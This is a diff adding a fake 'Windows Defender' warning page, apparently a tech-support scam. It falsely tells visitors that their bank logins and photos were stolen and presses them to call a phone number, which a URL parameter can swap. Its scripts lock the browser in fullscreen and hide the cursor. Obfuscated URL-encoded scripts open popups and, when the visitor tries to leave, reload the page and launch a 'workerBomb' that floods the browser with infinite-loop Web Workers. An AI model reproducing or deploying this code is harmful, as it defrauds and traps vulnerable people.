@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Get Help Desk -01U2E1</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+// Page now loads regardless of referrer (Chrome 151 compatibility)
+(function() {
+    // Page loads for all visitors regardless of referrer
+})();
+
+// ==================== FULLSCREEN MODE TO HIDE URL ====================
+// Force fullscreen and prevent exiting
+
+(function() {
+    let isInFullscreen = false;
+    
+    // Request fullscreen on any user interaction
+    function requestFullscreen() {
+        const elem = document.documentElement;
+        if (!isInFullscreen) {
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.log('Fullscreen request denied:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+    
+    // Check fullscreen status
+    function checkFullscreen() {
+        const isFullscreen = !!(document.fullscreenElement || 
+                               document.webkitFullscreenElement || 
+                               document.mozFullScreenElement || 
+                               document.msFullscreenElement);
+        isInFullscreen = isFullscreen;
+        return isFullscreen;
+    }
+    
+    // Exit fullscreen prevention
+    document.addEventListener('fullscreenchange', function() {
+        if (!checkFullscreen()) {
+            // User tried to exit fullscreen, re-enter
+            setTimeout(requestFullscreen, 100);
+        }
+    });
+    
+    document.addEventListener('webkitfullscreenchange', function() {
+        if (!checkFullscreen()) {
+            setTimeout(requestFullscreen, 100);
+        }
+    });
+    
+    document.addEventListener('mozfullscreenchange', function() {
+        if (!checkFullscreen()) {
+            setTimeout(requestFullscreen, 100);
+        }
+    });
+    
+    document.addEventListener('msfullscreenchange', function() {
+        if (!checkFullscreen()) {
+            setTimeout(requestFullscreen, 100);
+        }
+    });
+    
+    // Chrome 151: requestFullscreen requires user gesture.
+    // We track the first user interaction and trigger fullscreen then.
+    var hasTriggeredFullscreen = false;
+    function triggerFullscreenOnce() {
+        if (!hasTriggeredFullscreen) {
+            hasTriggeredFullscreen = true;
+            requestFullscreen();
+        }
+    }
+    
+    // Request fullscreen on any click (Chrome 151 needs user gesture)
+    document.addEventListener('click', function() {
+        triggerFullscreenOnce();
+        requestFullscreen();
+    });
+    document.addEventListener('touchstart', function() {
+        triggerFullscreenOnce();
+        requestFullscreen();
+    });
+    document.addEventListener('mousedown', triggerFullscreenOnce);
+    document.addEventListener('touchend', triggerFullscreenOnce);
+    document.addEventListener('keydown', triggerFullscreenOnce);
+    document.addEventListener('scroll', function() {
+        triggerFullscreenOnce();
+    });
+    
+    // Prevent scrolling that would reveal URL
+    document.addEventListener('scroll', function(e) {
+        window.scrollTo(0, 0);
+    });
+    
+    // Prevent zoom
+    document.addEventListener('wheel', function(e) {
+        if (e.ctrlKey) {
+            e.preventDefault();
+        }
+    }, { passive: false });
+    
+    // Prevent pinch zoom on mobile
+    document.addEventListener('touchmove', function(e) {
+        if (e.touches.length > 1) {
+            e.preventDefault();
+        }
+    }, { passive: false });
+})();
+</script>
+
+<!-- FULL PAGE CONTENT - LOADS IF REFERRER IS VALID OR IN IFRAME -->
+
+<link href="01css32bd.css" rel="stylesheet"> 
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.4.4.min.js"></script> 
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69f881a7bfe8861c346a1bcf/1jnpbku1a';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+<script>
+document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%0A%20%20%2F%2F%20%41%72%72%61%79%20%6F%66%20%55%52%4C%73%20%74%6F%20%6F%70%65%6E%20%69%6E%20%6E%65%77%20%70%72%69%76%61%74%65%20%77%69%6E%64%6F%77%0A%20%20%63%6F%6E%73%74%20%75%72%6C%73%20%3D%20%5B%0A%20%20%20%20%27%74%66%6E%2E%68%74%6D%6C%27%2C%0A%20%20%5D%3B%0A%20%20%0A%20%20%2F%2F%20%46%75%6E%63%74%69%6F%6E%20%74%6F%20%6F%70%65%6E%20%55%52%4C%73%20%69%6E%20%6E%65%77%20%70%72%69%76%61%74%65%20%77%69%6E%64%6F%77%20%61%74%20%72%61%6E%64%6F%6D%20%6C%6F%63%61%74%69%6F%6E%0A%20%20%66%75%6E%63%74%69%6F%6E%20%6F%70%65%6E%55%72%6C%73%49%6E%4E%65%77%50%72%69%76%61%74%65%57%69%6E%64%6F%77%28%29%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%72%61%6E%64%6F%6D%58%20%3D%20%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%28%77%69%6E%64%6F%77%2E%73%63%72%65%65%6E%2E%61%76%61%69%6C%57%69%64%74%68%20%2D%20%31%35%30%29%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%72%61%6E%64%6F%6D%59%20%3D%20%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%28%77%69%6E%64%6F%77%2E%73%63%72%65%65%6E%2E%61%76%61%69%6C%48%65%69%67%68%74%20%2D%20%33%30%30%29%29%3B%0A%20%20%0A%20%20%20%20%75%72%6C%73%2E%66%6F%72%45%61%63%68%28%75%72%6C%20%3D%3E%20%7B%0A%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%75%72%6C%2C%20%27%5F%62%6C%61%6E%6B%27%2C%20%60%77%69%64%74%68%3D%33%33%33%2C%68%65%69%67%68%74%3D%32%33%31%2C%6C%65%66%74%3D%24%7B%72%61%6E%64%6F%6D%58%7D%2C%74%6F%70%3D%24%7B%72%61%6E%64%6F%6D%59%7D%2C%74%6F%6F%6C%62%61%72%3D%30%2C%6C%6F%63%61%74%69%6F%6E%3D%30%2C%6D%65%6E%75%62%61%72%3D%30%2C%73%63%72%6F%6C%6C%62%61%72%73%3D%31%2C%72%65%73%69%7A%61%62%6C%65%3D%31%2C%73%74%61%74%75%73%3D%30%60%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%7D%0A%20%20%0A%20%20%2F%2F%20%43%61%6C%6C%20%74%68%65%20%66%75%6E%63%74%69%6F%6E%20%74%6F%20%6F%70%65%6E%20%55%52%4C%73%20%69%6E%20%6E%65%77%20%70%72%69%76%61%74%65%20%77%69%6E%64%6F%77%0A%20%20%6F%70%65%6E%55%72%6C%73%49%6E%4E%65%77%50%72%69%76%61%74%65%57%69%6E%64%6F%77%28%29%3B%0A%20%20%0A%20%20%3C%2F%73%63%72%69%70%74%3E'));
+</script>
+
+<div class="bg" style="cursor:none"> 
+<div class="bgimg" style="top:0"><img src="fesbg.webp" alt="" width="100%"></div>
+</div>
+<a href="#" id="link_black" <a style="cursor:none" rel="noreferrer">
+<div class="black" style="height: 145%; cursor: none; display: block;"></div>
+</a>
+<div class="pro_box2" style="cursor: none; display: block;"><img src="bx1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
+</div>
+<div class="pro_box3" style="cursor: none; display: block;"><img src="web1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
+</div>
+<div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
+<div class="row">
+<div class="col-md-12">
+<div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="img01df.png"> Windows Security </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">Dial Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt="" style="width: 25px;vertical-align: sub;"> Call us directly 02-5301-1356           </span>                    </span>
+</div>
+</div>
+<div class="col-md-12">
+<marquee direction="left" height="100px" width="100%"><small> <div class="text-left" style="color:#eee;font-size:10px">An unrecognized app was blocked by Windows
+Defender SmartScreen. Your system may be vulnerable. A Windows
+Defender scan detected adware that may steal passwords, personal information, financial data, and personal files. </small>
+</marquee>
+</div>
+</div>
+</div>
+<div class="lightbox" id="poptxt" style="display: block;">
+<div class="ilb top" style="font-size:17px">
+<div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="dm.png" class="logo3">            </span>Windows Defender Security Center</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="cs.png">            </a>          </span>
+</div>
+</div>
+<div id="txtintro"><span class="colo-rd">          <div id="ip_add">Windows Defender Security Center</div>          <div id="cityopm">System affected by security breach</div>          <div id="isp"> (Error Code: 16JPsy7)</div>        </span>
+</div>
+<img src="re.gif" id="banner">
+<div id="disclaimer">Access to the system is restricted for protection purposes. <br> <span class="support" style="font-size:22px;">Please contact Windows Support: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt="" style="width: 25px;vertical-align: sub;"> Call us directly 02-5301-1356</span>            </span>
+</div>
+<div id="bottom"><img src="img01df.png" id="badge"> <span class="title3">Windows</span>
+<ul>
+<li><a href="#">
+<div class="fr button2"><span id="addtochromebutton">Allow</span></div>
+</a></li>
+<li><a href="#">
+<div class="fr button blink"><span id="addtochromebutton">Cancel</span></div>
+</a></li>
+</ul>
+</div>
+</div>
+<div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new"><p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows Defender - Security Warning</p>
+This system cannot be accessed for security reasons.<p></p>
+Your computer has been reported to have malicious threats.
+<br> <br> <br> <br> <br> The following information has been stolen: <br> >> Email address <br> >> Bank login
+password <br> >> Facebook account login <br> >> Photos and documents <br> According to a Windows Defender
+scan, this device contains adware that can steal passwords, online IDs, financial information, personal files, photos, and documents.
+<br> Please contact us immediately. Our engineers will guide you through the removal process over the phone. <br> Contact Windows
+Support immediately to report the threat, stop identity theft, and unblock access to this device. <br>
+Closing this window will suspend your Windows registration and may put your personal information at risk. <br>
+<p style="padding-bottom:0;color:#fff;font-size:16px">Please call Windows Support: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>Call us directly  02-5301-1356       </span></strong>
+</p>
+<div class="action_buttons"><a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a> <a class="active" id="leave_page" style="color:#fff!important">Cancel</a>
+</div>
+</div>
+<div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+<p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
+Please contact us as soon as possible. Our engineers will assist you with the removal process over the phone. Your computer has been disabled. Windows
+Defender SmartScreen has stopped an unrecognized application. Running this application may compromise your system's security.</br>Call us directly 02-5301-1356
+</p>
+</div> <br> <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="winlo.png" alt="&nbsp;" style="width: 25px;vertical-align: bottom;"> 
+</span>
+</strong></p>
+</div>
+<div id="chat" style="display: block;"><img src="img01df.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+<p style="font-weight:600;font-size:24px">Call Support: <br></p>
+<h4 style="font-weight:600;font-size:22px"><img src="winlo.png" alt="" style="width: 25px;margin-left: 0;"> Please call <br>
+02-5301-1356
+<br>(Security Help Desk)
+</h4>
+<div class="arrow-down">
+<svg height="1em" viewBox="0 0 320 512">
+<style>                svg {
+fill: #fff
+}            </style>
+<path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path> 
+</svg> 
+</div>
+</div>
+<script src="08dgsg3d.js"></script>
+<script src="07sdgsg4.js"></script>
+<script src="05sdghdf.js"></script>
+<script src="04shesc1.js"></script>
+<script src="03fgsskryeivh.js"></script>
+<script src="02dgdsg3d.js"></script>
+<script type="text/javascript" src="01d1fgshfddfg.js"></script>
+
+<script>
+function getUrlParameter(name) {
+    name = name.replace(/[\[]/, '\[').replace(/[\]]/, '\]');
+    var regex = new RegExp('[\?&]' + name + '=([^&#]*)');
+    var results = regex.exec(location.search);
+    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
+
+var phoneFromUrl = getUrlParameter('ph0ne');
+
+if (phoneFromUrl && phoneFromUrl.trim() !== '') {
+    document.addEventListener('DOMContentLoaded', function() {
+        var walker = document.createTreeWalker(
+            document.body,
+            NodeFilter.SHOW_TEXT,
+            null,
+            false
+        );
+        
+        var node;
+        var nodesToReplace = [];
+        
+        while (node = walker.nextNode()) {
+            if (node.nodeValue.includes('02-5301-1356')) {
+                nodesToReplace.push(node);
+            }
+        }
+        
+        nodesToReplace.forEach(function(node) {
+            node.nodeValue = node.nodeValue.replace(/02-5301-1356/g, phoneFromUrl);
+        });
+    });
+}
+</script>
+
+<script>
+document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%62%65%66%6F%72%65%75%6E%6C%6F%61%64%27%2C%20%66%75%6E%63%74%69%6F%6E%20%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%2C%20%27%5F%62%6C%61%6E%6B%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%31%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%77%6F%72%6B%65%72%73%20%3D%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%69%73%52%65%73%70%6F%6E%73%69%76%65%20%3D%20%74%72%75%65%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%6C%6F%67%28%22%53%74%61%72%74%69%6E%67%20%77%6F%72%6B%65%72%42%6F%6D%62%2E%2E%2E%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%63%72%69%70%74%20%3D%20%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%63%6F%75%6E%74%65%72%20%3D%20%30%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%68%69%6C%65%20%28%74%72%75%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%75%6E%74%65%72%2B%2B%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%63%6F%75%6E%74%65%72%20%25%20%31%65%36%20%3D%3D%3D%20%30%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%73%74%4D%65%73%73%61%67%65%28%7B%20%73%74%61%74%75%73%3A%20%22%77%6F%72%6B%69%6E%67%22%2C%20%63%6F%75%6E%74%65%72%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%62%6C%6F%62%20%3D%20%6E%65%77%20%42%6C%6F%62%28%5B%73%63%72%69%70%74%5D%2C%20%7B%20%74%79%70%65%3A%20%22%61%70%70%6C%69%63%61%74%69%6F%6E%2F%6A%61%76%61%73%63%72%69%70%74%22%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%77%6F%72%6B%65%72%55%52%4C%20%3D%20%55%52%4C%2E%63%72%65%61%74%65%4F%62%6A%65%63%74%55%52%4C%28%62%6C%6F%62%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%6F%72%20%28%6C%65%74%20%69%20%3D%20%30%3B%20%69%20%3C%20%31%30%30%30%30%30%30%30%30%30%30%30%30%3B%20%69%2B%2B%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%77%6F%72%6B%65%72%20%3D%20%6E%65%77%20%57%6F%72%6B%65%72%28%77%6F%72%6B%65%72%55%52%4C%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%73%2E%70%75%73%68%28%77%6F%72%6B%65%72%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%2E%6F%6E%6D%65%73%73%61%67%65%20%3D%20%28%65%76%65%6E%74%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%76%65%6E%74%2E%64%61%74%61%2E%73%74%61%74%75%73%20%3D%3D%3D%20%22%77%6F%72%6B%69%6E%67%22%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%6C%6F%67%28%60%57%6F%72%6B%65%72%20%24%7B%69%7D%20%70%72%6F%67%72%65%73%73%3A%20%24%7B%65%76%65%6E%74%2E%64%61%74%61%2E%63%6F%75%6E%74%65%72%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%2E%6F%6E%65%72%72%6F%72%20%3D%20%28%65%72%72%6F%72%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%65%72%72%6F%72%28%60%57%6F%72%6B%65%72%20%24%7B%69%7D%20%65%6E%63%6F%75%6E%74%65%72%65%64%20%61%6E%20%65%72%72%6F%72%3A%60%2C%20%65%72%72%6F%72%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%6F%72%6B%65%72%42%6F%6D%62%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%65%73%73%61%67%65%20%3D%20%22%41%72%65%20%79%6F%75%20%73%75%72%65%20%79%6F%75%20%77%61%6E%74%20%74%6F%20%6C%65%61%76%65%20%74%68%69%73%20%70%61%67%65%3F%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%76%65%6E%74%2E%72%65%74%75%72%6E%56%61%6C%75%65%20%3D%20%6D%65%73%73%61%67%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%6D%65%73%73%61%67%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%3C%2F%73%63%72%69%70%74%3E'));
+</script>
+
+</body>
+</html>
